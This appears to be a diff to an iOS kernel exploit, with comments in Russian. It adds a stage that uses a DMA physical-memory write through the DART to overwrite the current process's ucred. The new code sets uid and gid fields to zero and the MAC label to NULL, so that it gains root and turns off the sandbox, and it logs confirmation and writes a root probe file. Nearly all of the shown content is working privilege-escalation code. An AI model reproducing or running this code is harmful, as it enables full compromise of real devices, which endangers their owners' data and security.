@@ -6264,8 +6264,6 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     if (pfn32 && ctlPFN) {
         uint64_t ftVA2 = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
         uint64_t totalPages2 = kconstant(physSize) >> 14;
-        uint64_t hitAddr[24], hitOld[24]; int hitForm[24];
-        int nDep = 0;
         static uint8_t ftCh2[0x10000];
         for (uint64_t fb = 0; fb < totalPages2 && nDep < 24 && ftVA2; fb += 4096) {
             uint64_t nent = totalPages2 - fb; if (nent > 4096) nent = 4096;
@@ -6306,6 +6304,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         }
     }
     // 1.9.198: VA-FIELD DEPUTY — 1.9.197 доказал: prepare считает PA = vtophys
+    uint64_t hitAddr[24], hitOld[24]; int hitForm[24];   // DEP-хиты уровня функции — форж перепатчит на ucredPFN (1.9.208)
+    int nDep = 0;
     // (kernel VA буфера) на лету (слот откатился в ОРИГИНАЛ при пропатченных
     // pfn-хранилищах — источник = трансляция, не хранилище). Патчим само
     // VA-поле: ищем в plane-desc/rangeObj/surf указатель P с [P] == маркер
@@ -6986,6 +6986,92 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     }
     if (changed) {
         kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===", changed]);
+        // 1.9.208: ФОРЖ UCRED — тот же physwrite, цель = страница нашего ucred.
+        // Карта р.18: cr_uid/ruid/svuid +0x18/1c/20, groups[0] +0x28, rgid/svgid
+        // +0x68/6c, cr_label +0x78 → NULL (sandbox off). DART пишет мимо SPTM RO.
+        {
+            uint64_t prF = 0, roF = 0, ucF = 0;
+            if (selfProcM) {
+                prF = early_kread64(selfProcM + koffsetof(proc, proc_ro));
+                roF = prF ? kp_untag_ptr(prF) : 0;
+                ucF = roF ? kp_untag_ptr(early_kread64(roF + koffsetof(proc_ro, ucred))) : 0;
+            }
+            kpNote(r, [NSString stringWithFormat:@"  [FORGE] proc_ro=%#llx ucred=%#llx (getuid=%u getgid=%u)",
+                      (unsigned long long)roF, (unsigned long long)ucF, getuid(), getgid()]);
+            if (kpLooksLikeKernelPointer(ucF)) {
+                uint64_t pageVA = ucF & ~0x3fffULL;
+                uint32_t uoff = (uint32_t)(ucF & 0x3fff);
+                uint64_t pagePA = kvtophys(pageVA);
+                // ДВЕ валидации PA перед любой записью: (1) phystokv(pagePA) читается
+                // и первый qword совпадает с [pageVA]; (2) uid-поле == getuid().
+                uint64_t pkva = pagePA ? phystokv(pagePA) : 0;
+                uint64_t q0a = pkva ? early_kread64(pkva) : 1;
+                uint64_t q0b = early_kread64(pageVA);
+                uint32_t uidViaPA = pkva ? (uint32_t)early_kread64(pkva + uoff + 0x18) : 0xdead;
+                BOOL paOK = (q0a == q0b) && (uidViaPA == (uint32_t)getuid());
+                kpNote(r, [NSString stringWithFormat:@"  [FORGE] pageVA=%#llx pagePA=%#llx uoff=%#x — валидация PA: %@",
+                          (unsigned long long)pageVA, (unsigned long long)pagePA, uoff, paOK ? @"СОШЛАСЬ" : @"НЕ СОШЛАСЬ — записи не будет"]);
+                if (paOK && uoff + 0xc0 <= 0x1000) {
+                    uint8_t fbuf[0x1000];
+                    for (uint32_t i = 0; i < 0x1000; i += 8) *(uint64_t *)(fbuf + i) = early_kread64(pageVA + i);
+                    *(uint32_t *)(fbuf + uoff + 0x18) = 0;   // cr_uid
+                    *(uint32_t *)(fbuf + uoff + 0x1c) = 0;   // cr_ruid
+                    *(uint32_t *)(fbuf + uoff + 0x20) = 0;   // cr_svuid
+                    *(uint32_t *)(fbuf + uoff + 0x28) = 0;   // cr_groups[0]
+                    *(uint32_t *)(fbuf + uoff + 0x68) = 0;   // cr_rgid
+                    *(uint32_t *)(fbuf + uoff + 0x6c) = 0;   // cr_svgid
+                    *(uint64_t *)(fbuf + uoff + 0x78) = 0;   // cr_label = NULL (sandbox off)
+                    IOSurfaceLock(srcS, 0, NULL);
+                    uint8_t *sp2 = (uint8_t *)IOSurfaceGetBaseAddress(srcS);
+                    if (sp2) memcpy(sp2, fbuf, 0x1000);
+                    IOSurfaceUnlock(srcS, 0, NULL);
+                    uint32_t fPFN = (uint32_t)(pagePA >> 14);
+                    // слоты (restore'нуты к этому моменту) — заново на ucredPagePA
+                    for (int j = 0; j < nSlots; j++) {
+                        uint64_t nq = (slotForm[j] == 1) ? (((uint64_t)fPFN << 32) | (origQs[j] & 0xFFFFFFFFULL))
+                                     : (slotForm[j] == 2) ? pagePA
+                                     : (slotForm[j] == 3) ? (pagePA >> 14)
+                                     : ((origQs[j] & 0xFFFFFFFF00000000ULL) | (uint64_t)fPFN);
+                        early_kwrite64(slotVAs[j], nq);
+                        uint64_t rb = early_kread64(slotVAs[j]);
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] слот#%d → ucredPagePA: %#018llx — %@", j, (unsigned long long)rb,
+                                  rb == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    }
+                    // DEP-хиты — перепатч на ucredPFN (покрываем оба пути prepare)
+                    for (int i = 0; i < nDep; i++) {
+                        uint64_t nq = (hitForm[i] == 1) ? ((hitOld[i] & 0x3fffULL) | pagePA)
+                                    : (hitForm[i] == 3) ? (((uint64_t)fPFN << 32) | (hitOld[i] & 0xffffffffULL))
+                                    : (hitForm[i] == 4) ? ((hitOld[i] & 0xffffffff00000000ULL) | fPFN)
+                                    : (uint64_t)fPFN;
+                        early_kwrite64(hitAddr[i], nq);
+                    }
+                    if (nDep) kpNote(r, [NSString stringWithFormat:@"  [FORGE] DEP-хиты перепатчены на ucredPFN (%d шт)", nDep]);
+                    // victim#2 submit (bit43=0 — свежий rebuild из отравленного источника)
+                    uint8_t tsdF[0x1B0];
+                    memcpy(tsdF, tsdV, sizeof(tsdF));
+                    *(uint32_t *)(tsdF + 0) = srcID;
+                    *(uint32_t *)(tsdF + 4) = dstID;
+                    *(uint64_t *)(tsdF + 8) = 1;
+                    kern_return_t fkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdF, sizeof(tsdF), NULL, NULL, NULL, NULL);
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] victim#2 submit (ucredPA): kr=0x%x — жду DMA в ucred", fkr]);
+                    usleep(400000);
+                    uid_t gu = getuid(); gid_t gg = getgid();
+                    uint32_t cru = (uint32_t)early_kread64(ucF + 0x18);
+                    uint64_t lbl = early_kread64(ucF + 0x78);
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] getuid()=%u getgid()=%u | cr_uid=%u cr_label=%#llx",
+                              gu, gg, cru, (unsigned long long)lbl]);
+                    if (gu == 0) {
+                        kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — форж ucred через DART physwrite РАБОТАЕТ (мимо SPTM RO) ===");
+                        FILE *fp = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] sandbox-проба (запись в /var/mobile): %@",
+                                  fp ? @"УСПЕХ — label снят, песочницы нет" : @"ОТКАЗ — label на месте"]);
+                        if (fp) { fputs("root via DART physwrite\n", fp); fclose(fp); }
+                    }
+                } else if (paOK) {
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] ucred слишком глубоко в странице (uoff=%#x > 0xf40) — нужен src > 4КБ, следующий билд", uoff]);
+                }
+            }
+        }
     } else {
         kpNote(r, @"=== контрольная не изменилась — см. выше ===");
     }
